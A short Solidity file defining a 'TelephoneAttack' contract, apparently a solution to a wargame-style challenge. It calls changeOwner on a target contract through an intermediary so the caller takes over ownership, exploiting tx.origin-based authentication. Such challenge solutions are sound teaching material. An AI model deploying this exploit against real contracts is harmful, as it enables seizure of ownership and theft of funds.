pragma solidity ^0.6.0;

interface ITarget {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    function attack(address target_) public {
        ITarget(target_).changeOwner(msg.sender);
    }
}
